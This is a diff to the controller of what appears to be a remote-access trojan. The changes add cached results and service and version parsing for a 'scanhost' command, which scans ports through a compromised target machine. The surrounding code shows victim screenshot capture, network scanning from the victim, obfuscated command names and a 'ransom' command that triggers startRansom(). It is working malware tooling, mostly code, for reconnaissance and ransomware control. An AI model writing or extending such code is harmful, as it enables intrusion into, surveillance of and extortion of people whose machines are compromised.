@@ -2,6 +2,7 @@
 import ast
 import base64
 import os
+import pprint
 import sys
 import socket
 import ssl
@@ -576,7 +577,10 @@ def scannet(targetConn, command, cachedCommands):
 
 def scanhost(targetConn, command, cachedCommands):
     if command in cachedCommands['commands']:
-        print("\n{}Cached Command: {}HOST: {}\n\t\tPORTS: {}".format(Y, END, command.replace("scanhost", ""), cachedCommands['commands'][command]))
+        print(f"\n{Y}Cached Command:\n{END}")
+        printProcessData(cachedCommands['commands'][command])
+        return 0
+        #print("\n{}Cached Command: {}HOST: {}\n\t\tPORTS: {}".format(Y, END, command.replace("scanhost", ""), cachedCommands['commands'][command]))
 
     else:
         coded = command.replace("scanhost", "c2Nhbmhvc3QK")
@@ -588,12 +592,60 @@ def scanhost(targetConn, command, cachedCommands):
                 print(data, end="\r")
             elif "Error" in data:
                 print("\n", data)
-                break
+                return 1
             else:
                 print(f"\n\n\t[>] Open Ports: {data}\n")
                 cachedCommands['commands'][command] = data
                 break
+    return 0
 
+
+def scanPorts(ports, host, targetConn, cachedCommands, command):
+    print(f"{R}[*>] {Y}Scanning service of ports. This may take a while - {host} - {ports}{END}")
+    buffer = int(targetConn.recv(1024).decode().replace("buffer ", ""))
+    while True:
+        data = targetConn.recv(buffer + 10)
+        if data == "formed data".encode():
+            data = targetConn.recv(buffer + 10).decode()
+            break
+    data = ast.literal_eval(data)
+    cachedCommands['commands'][command] = data
+    return data
+
+
+def printProcessData(formedData):
+    for ip in formedData[0]:
+        print(f"\n{Y}[*>] IP ADDRES -> {END}{ip}")
+        for port in formedData[0][ip]:
+            try:
+                servicedata = ast.literal_eval(formedData[0][ip][port])
+                probename = servicedata.get('probe', {}).get('probename')
+                probestr = servicedata.get('probe', {}).get('probestring')
+                pattern = servicedata.get('match', {}).get('pattern')
+                versioninfo = servicedata.get('match', {}).get('versioninfo', {})
+                vendorproduct = versioninfo.get('vendorproductname')
+                version = versioninfo.get('version')
+                info = versioninfo.get('info')
+                hostname = versioninfo.get('hostname')
+                os = versioninfo.get('operatingsystem')
+                cpename = versioninfo.get('cpename')
+
+                # Print only if the variable exists
+                print(f"\n\t{Y}[*>] PORT: {END}{port}")
+                if probename or probestr or pattern or vendorproduct or version or info or hostname or os or cpename:
+                    if probename: print(f"{B}\t\tProbe Name:{END}\t {probename}")
+                    if probestr: print(f"{B}\t\tProbe String:{END}\t {probestr}")
+                    if pattern: print(f"{B}\t\tPattern:{END}\t {pattern}")
+                    if vendorproduct: print(f"{B}\t\tVendor Product:{END}\t {vendorproduct}")
+                    if version: print(f"{B}\t\tVersion:{END}\t {version}")
+                    if info: print(f"{B}\t\tInformation:{END}\t {info}")
+                    if hostname: print(f"{B}\t\tHostname:{END}\t {hostname}")
+                    if os: print(f"{B}\tOperating System:{END}\t {os}")
+                    if cpename: print(f"{B}\t\tCPE Name:{END}\t {cpename}")
+                else:
+                    print("\t\tUnknown")
+            except SyntaxError:
+                print(f"\n\t{Y}[*>] PORT: {END}{port}\n\t\t{formedData[0][ip][port]}")
 
 def mainFunctions(ip, targetConn, ses):
     if not os.path.exists(f"./DATA/{ip[0]}"):
@@ -667,7 +719,6 @@ def mainFunctions(ip, targetConn, ses):
                 reciveScreenshot(targetConn, ip)
 
             elif command.startswith("scannet"):
-                global hosts
                 scannet(targetConn, command, cachedCommands)
 
             elif command == "hosts":
@@ -679,7 +730,12 @@ def mainFunctions(ip, targetConn, ses):
                     print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
 
             elif command.startswith("scanhost"):
-                scanhost(targetConn, command, cachedCommands)
+                res = scanhost(targetConn, command, cachedCommands)
+                if res == 0:
+                    formedData = scanPorts(cachedCommands['commands'][command], command.replace("scanhost ", ""), targetConn, cachedCommands, command)
+                    printProcessData(formedData)
+                else:
+                    print("\nERROR SCANNING HOST...")
 
             elif command.startswith("ransom"):
                 startRansom()
